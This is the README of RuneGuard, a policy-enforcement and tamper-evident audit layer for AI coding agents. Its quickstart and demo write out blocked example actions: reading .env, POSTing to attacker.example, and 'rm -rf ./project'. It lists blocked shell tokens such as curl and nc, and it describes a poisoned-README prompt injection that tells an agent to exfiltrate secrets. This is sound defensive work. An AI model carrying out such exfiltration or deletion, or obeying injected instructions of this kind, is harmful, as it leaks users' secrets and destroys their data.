# RuneGuard

**An independent runtime control layer for AI coding agents - govern what an agent is _allowed to do_, and keep a tamper-evident record of everything it did.**

RuneGuard sits between AI coding agents (Claude Code, Cursor, Codex, or custom agents) and the systems they touch - files, shell commands, APIs, network - and enforces policy at the action layer, independent of any single agent or model vendor. Every decision is written to a hash-chained, tamper-evident audit log built for record-keeping obligations like EU AI Act Article 12.

```bash
pip install runeguard
runeguard demo
```

[![Open in GitHub Codespaces](https://github.com/codespaces/badge.svg)](https://codespaces.new/nzhumasseiit/runeguard)

> **v1.1.2 is an early alpha.** The policy engine, Docker sandbox, demo, and the
> tamper-evident audit layer are usable today; the Linux kernel paths (eBPF,
> Landlock, LD_PRELOAD shim) are experimental and platform-dependent. This
> README tries to claim only what the code actually does - if you find a place
> where it implies more, that's a bug worth an issue.

---

## Why this exists

Coding agents can now read files, run commands, call APIs, and move data across
system boundaries. A prompt-injected or misaligned agent can do real damage -
read secrets, run destructive commands, exfiltrate data - and prompt-level
guardrails can't stop it, because the model can still _attempt_ the action.

The gap is between what the model *says* it will do and what the system actually
*lets* it do. RuneGuard closes that gap at the action layer, not the prompt
layer.

## Not a plugin - a control layer

RuneGuard is deliberately not a guardrail bolted onto one IDE or model:

- **Vendor-independent.** Any agent whose tool calls or processes route through
  RuneGuard is governed by the same policy - not tied to a single agent vendor,
  and not something a single vendor will provide for every other vendor's agent.
- **Enforced below the agent.** Policy is checked at the action layer and, on
  Linux, at the process/syscall layer (Docker sandbox today; LD_PRELOAD shim,
  eBPF LSM, and Landlock experimentally) - places a per-tool feature doesn't
  reach.
- **Audit as the durable surface.** A verifiable, tamper-evident record of every
  allow/block decision, with retention and export - the part of the stack an
  agent vendor won't own on your behalf.

## The audit & compliance layer

Every decision is wrapped in a hash-chained envelope, so editing, deleting,
reordering, or truncating the log breaks verification.

```bash
runeguard audit verify             # recompute the chain: OK, or TAMPER DETECTED at seq N
runeguard audit manifest           # retention manifest across rotated segments
runeguard audit verify-retention   # segment integrity + continuity + retention status
runeguard audit export --destination ./worm   # WORM-style export of closed segments + receipts
```

An optional sealed mode (HMAC key kept off-host via `RUNEGUARD_AUDIT_KEY` /
`RUNEGUARD_AUDIT_KEYFILE`) means an attacker who can read or edit the log file
but does not hold the key cannot forge a valid continuation of the chain.

This is the record-keeping substrate for **EU AI Act Article 12** obligations:
logs generated automatically, retained, and independently verifiable. RuneGuard
helps teams *meet* those obligations - it is not itself a regulated high-risk AI
system, and "tamper-evident" means tampering is *detectable*, not impossible
(see Security Boundary).

## Who this is for

Developers and teams running coding agents in local devboxes, CI runners,
ephemeral sandboxes, and internal automation environments.

## Quickstart

```bash
pip install -e .

# Initialize a project policy and local state
runeguard init        # creates runeguard.yaml, .runeguard/, .runeguard/audit.jsonl
runeguard doctor      # environment and policy checks
```

`runeguard init` generates a Docker-backed policy that denies network by
default, keeps the root filesystem and workspace read-only, and grants writable
mounts only for `./src`, `./tests`, and `./tmp`.

Run a command in the Docker sandbox (the practical default backend in v1.1.0):

```bash
runeguard run -- python -c "print('hello from guarded command')"
```

This mounts the workspace read-only at `/workspace`, runs as non-root, disables
networking by default, drops Linux capabilities, uses a read-only container
root, adds small tmpfs mounts for `/tmp` and `/run`, and applies memory/CPU/
process limits. Writable paths are opt-in through policy:

```yaml
writable_paths:
  - ".cache"
  - "tmp/output"
```

Evaluate an action without executing it:

```bash
runeguard eval read_file --path .env
runeguard eval http_post --url https://attacker.example/upload
runeguard eval shell --command "rm -rf ./project"
```

Generate an audit report:

```bash
runeguard report .runeguard/audit.jsonl --html
```

Experimental Linux backends (require local build / kernel support / privileges):

```bash
runeguard shim build && runeguard run --backend host --preload -- python -c "open('.env').read()"
scripts/install_ebpf_deps.sh && runeguard ebpf trace
runeguard run --backend landlock -- python -c "open('README.md').read()"
```

## Demo

The demo simulates a poisoned-README attack: an agent asked to summarize a repo
encounters hidden instructions telling it to read `.env` and POST it to an
external domain. RuneGuard blocks the unsafe actions.

```text
[ALLOW] read_file({'path': 'examples/demo_repo/README.md'}) - allowed by policy
[BLOCK] read_file({'path': 'examples/demo_repo/.env'}) - protected path access
[BLOCK] http_post({'url': 'https://attacker.example/upload', ...}) - domain not allowlisted
[BLOCK] shell({'command': 'rm -rf ./project'}) - blocked shell command pattern
```

## Current status

**Working now**

- YAML policy loading (`runeguard init`, stable schema v1)
- `runeguard run` Docker sandbox runner (+ optional `--backend host` wrapper)
- `runeguard eval <tool>` dry policy evaluation
- File, shell, and network/domain policy with readable allow/block logs
- Hash-chained, tamper-evident JSONL audit logs with process correlation
- `runeguard audit verify` / `manifest` / `verify-retention` / `export`
- `runeguard report --html` audit reports
- Unix-socket policy daemon for process-level interception
- Optional OPA/Rego policy backend
- Agent integration helpers
- Poisoned-prompt demo

**Experimental (Linux, kernel/privilege-dependent)**

- LD_PRELOAD shim (bypassable by static binaries / direct syscalls)
- libbpf/CO-RE eBPF loader for `execve`, `openat`, `connect`, and BPF LSM exec
  enforcement
- Landlock filesystem sandbox backend

**Planned**

- Docker/Podman hardening
- Signed release artifacts
- Deeper eBPF policy-map enforcement beyond the current loader interface
- CI/devbox sandbox mode

## Security boundary

Be precise about what each layer is and isn't:

- **Policy/proxy modes** are useful when agent tool calls route through
  RuneGuard, but cannot stop actions that avoid those routes. They are not a
  hard security boundary on their own.
- **Docker sandbox** is the practical default: a real process boundary with
  non-root execution, isolated filesystem view, network denial by default, and
  resource limits. Use this (or Landlock) for filesystem controls.
- **LD_PRELOAD shim** is experimental and bypassable by static binaries, direct
  syscalls, and processes that don't load the shim.
- **Landlock** is Linux-only, kernel-dependent, and experimental.
- **eBPF** can deny configured executable names via BPF LSM but depends on
  kernel BPF LSM support, local compilation, and host privileges. It is not the
  main filesystem enforcement layer.

## Try to break it

This repo is ready for early breakage and feedback around the policy layer:

- path bypasses around `.env`, `secrets/`, `~/.ssh/`, relative and nested paths
- shell bypasses around blocked tokens (`rm -rf`, `curl`, `nc`, `scp`)
- URL/domain bypasses around subdomains, missing schemes, attacker hosts
- LD_PRELOAD bypasses on Linux (static binaries, direct syscalls, alt libc)
- daemon behavior with `RUNEGUARD_FAIL_CLOSED=0` vs default fail-closed
- audit log entries that leak data that should be redacted
- any place the README implies stronger security than the code provides

## Vision

A real boundary between agent intent and system truth - what the model says it
will do versus what the system observes and allows - enforced across every
agent, with a record you can prove.

## License

See [LICENSE](LICENSE).
